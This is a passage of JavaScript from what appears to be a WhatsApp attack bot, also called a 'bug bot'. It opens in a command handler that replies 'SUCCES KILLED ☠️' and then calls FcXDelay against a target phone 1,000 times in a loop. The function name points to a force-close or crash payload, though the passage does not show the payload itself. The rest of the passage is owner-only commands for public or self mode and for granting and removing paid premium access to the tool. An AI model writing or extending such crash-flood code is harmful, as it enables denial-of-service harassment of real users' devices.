m.reply(`\`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️\`\n\n> *© 𝐊𝐈𝐍𝐆 𝐒𝐌𝐈𝐋𝐄𝐒  `);

          for (let i = 0; i < 125; i++) {
          await FcXDelay(target, mention)
          await FcXDelay(target, mention)
          await FcXDelay(target, mention)
          await FcXDelay(target, mention)
          await FcXDelay(target, mention)
          await FcXDelay(target, mention)
          await FcXDelay(target, mention)
          await FcXDelay(target, mention)
            await sleep(1500);
        }

    }
  
break;

//======================



//======================

case 'public': {
if (!isCreator) return m.reply(mess.owner) 
if (james.public === true) return m.reply("`𝖲𝗎𝖼𝖼𝖾𝗌s ☠️`");
james.public = true
m.reply(mess.succes)
}
break

//======================

case 'self': {
if (!isCreator) return m.reply(mess.owner) 
if (james.public === false) return m.reply("`𝖲𝗎𝖼𝖼𝖾𝗌s ☠️`");
james.public = false
m.reply(mess.succes)
}
break

//======================

//======================

case "addprem": {
if (!isCreator) return m.reply(mess.owner);
if (!text) return m.reply(`❌ *ᴇxᴀᴍᴘʟᴇ* : ${prefix + command} 254xxxxxx`);
let user = text.replace(/[^\d]/g, "");
addPremiumUser(user, 30);
m.reply(`✅ sᴜᴄᴄᴇssғᴜʟʟʏ ᴀᴅᴅ ᴘʀᴇᴍɪᴜᴍ :\n• ${user} ( 30 ᴅᴀʏs )`)}
break;

//======================

case "delprem": {
if (!isCreator) return m.reply(mess.owner);
if (!text) return m.reply(`❌ *ᴇxᴀᴍᴘʟᴇ* : ${prefix + command} 254xxxxxx`);
let user = text.replace(/[^\d]/g, ""); 
let removed = delPremiumUser(user);
m.reply(removed ? `✅ sᴜᴄᴄᴇssғᴜʟʟʏ ʀᴇᴍᴏᴠᴇᴅ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀ\n• ${user}` : "ғᴀɪʟᴇᴅ ᴜsᴇʀ ɴᴏᴛ ᴅᴇᴛᴇᴄᴛᴇᴅ")}

break;

default:
}} catch (err) {
console.log('\x1b[1;31m'+err+'\x1b[0m')}}